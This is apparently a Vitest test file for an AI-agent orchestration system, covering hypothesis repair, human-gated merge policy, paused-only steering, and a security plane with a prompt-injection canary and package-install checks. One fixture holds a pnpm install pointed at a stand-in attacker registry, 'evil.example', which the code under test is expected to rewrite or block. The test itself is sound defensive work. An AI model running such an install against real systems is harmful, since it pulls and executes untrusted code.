// Phase 2 core mechanisms: hypothesis repair, merge policy + meta-governance, steering, security plane.
import { describe, it, expect } from 'vitest';
import { mkdtempSync } from 'node:fs';
import { tmpdir } from 'node:os';
import { join } from 'node:path';
import { makeLog } from './helpers.js';
import { runHypothesisProbes } from '../src/repair.js';
import { decideMerge, applyPolicyChange } from '../src/merge-policy.js';
import { Steering } from '../src/steering.js';
import { checkInjectionCanary, checkPackageInstall } from '../src/security-plane.js';

const wt = () => mkdtempSync(join(tmpdir(), 'p2-'));

describe('hypothesis repair (§9.3)', () => {
  it('confirms the hypothesis whose probes pass; refuted ones are recorded', () => {
    const log = makeLog();
    const out = runHypothesisProbes(log, 'T-r', wt(), [
      { statement: 'wrong: file exists', probes: [{ cmd: 'test', args: ['-f', 'nope'], expectExitCode: 0 }], ifConfirmed: { patchPlan: 'x', estimatedBlastRadius: '1 file' } },
      { statement: 'right: true is true', probes: [{ cmd: 'true', args: [], expectExitCode: 0 }], ifConfirmed: { patchPlan: 'patch y', estimatedBlastRadius: '1 file' } },
    ]);
    expect(out.confirmed?.statement).toMatch(/right/);
    expect(out.refuted).toHaveLength(1);
    expect(log.eventsFor('T-r').filter((e) => e.type === 'HYPOTHESIS_REFUTED')).toHaveLength(1);
  });

  it('all refuted -> escalate with hypothesis log', () => {
    const log = makeLog();
    const out = runHypothesisProbes(log, 'T-r2', wt(), [
      { statement: 'a', probes: [{ cmd: 'false', args: [], expectExitCode: 0 }], ifConfirmed: { patchPlan: '', estimatedBlastRadius: '' } },
    ]);
    expect(out.escalate).toBe(true);
    expect(out.refuted).toEqual(['a']);
  });
});

describe('merge policy + meta-governance (§6.6 / INV-16)', () => {
  it('L0/L1 auto-merge with sampling; L3 human; L4 never', () => {
    const log = makeLog();
    expect(decideMerge(log, 'T-m', 'L1', true, { auditSampleRate: 1, rng: () => 0 }).action).toBe('auto-merge');
    expect(decideMerge(log, 'T-m', 'L1', true, { auditSampleRate: 1, rng: () => 0 }).sampledForAudit).toBe(true);
    expect(decideMerge(log, 'T-m', 'L3', true).action).toBe('needs-human');
    expect(decideMerge(log, 'T-m', 'L4', true).action).toBe('forbidden-auto');
    expect(decideMerge(log, 'T-m', 'L0', false).action).toBe('needs-review');
  });

  it('gate-loosening policy change refused without human approval; tightening applies', () => {
    const log = makeLog();
    const loosen = applyPolicyChange(log, { key: 'auditSampleRate', from: 0.2, to: 0.05, loosens: true }, false);
    expect(loosen.applied).toBe(false);
    const tighten = applyPolicyChange(log, { key: 'auditSampleRate', from: 0.2, to: 0.5, loosens: false }, false);
    expect(tighten.applied).toBe(true);
    const approvedLoosen = applyPolicyChange(log, { key: 'auditSampleRate', from: 0.2, to: 0.1, loosens: true }, true);
    expect(approvedLoosen.applied).toBe(true);
  });
});

describe('steering (§10.3)', () => {
  it('guidance requires pause; AC/scope guidance refused as advisory; accepted guidance is marked data', () => {
    const log = makeLog();
    const s = new Steering(log);
    expect(s.inject('T-s', { text: 'try x', touchesAcOrScope: false }).accepted).toBe(false);
    s.requestPause('T-s');
    expect(s.inject('T-s', { text: 'drop AC-2', touchesAcOrScope: true }).accepted).toBe(false);
    const ok = s.inject('T-s', { text: 'prefer smaller diff', touchesAcOrScope: false });
    expect(ok.accepted).toBe(true);
    expect(ok.asDataPiece?.content).toMatch(/data, advisory/);
    s.resume('T-s');
    expect(s.isPaused('T-s')).toBe(false);
    expect(log.eventsFor('T-s').map((e) => e.type)).toContain('GUIDANCE_REFUSED_NEEDS_AMENDMENT');
  });
});

describe('security plane phase 2 (§10.1)', () => {
  it('canary tripwire fires on marker in structured output', () => {
    const log = makeLog();
    expect(checkInjectionCanary(log, 'T-c', { echo: 'CANARY-9911-TRIPPED' }).tripped).toBe(true);
    expect(checkInjectionCanary(log, 'T-c', { echo: 'clean' }).tripped).toBe(false);
    expect(log.eventsFor('T-c').some((e) => e.type === 'INJECTION_CANARY_TRIPPED')).toBe(true);
  });

  it('package install pinned to allowlisted registry with --ignore-scripts forced', () => {
    const log = makeLog();
    const d = checkPackageInstall(log, 'T-d', {
      type: 'RUN_COMMAND', actionId: 'a1', cmd: 'pnpm', args: ['add', 'leftpad', '--registry=https://evil.example'],
    }, { allowedRegistries: ['https://registry.npmjs.org/'], installersAllowed: ['pnpm', 'npm'] });
    expect(d.allowed).toBe(true);
    expect(d.rewrittenArgs).toContain('--ignore-scripts');
    expect(d.rewrittenArgs?.join(' ')).toContain('registry.npmjs.org');
    expect(d.rewrittenArgs?.join(' ')).not.toContain('evil.example');

    const bad = checkPackageInstall(log, 'T-d', {
      type: 'RUN_COMMAND', actionId: 'a2', cmd: 'curl', args: ['install'],
    }, { allowedRegistries: ['https://registry.npmjs.org/'], installersAllowed: ['pnpm'] });
    expect(bad.allowed).toBe(false);
  });
});
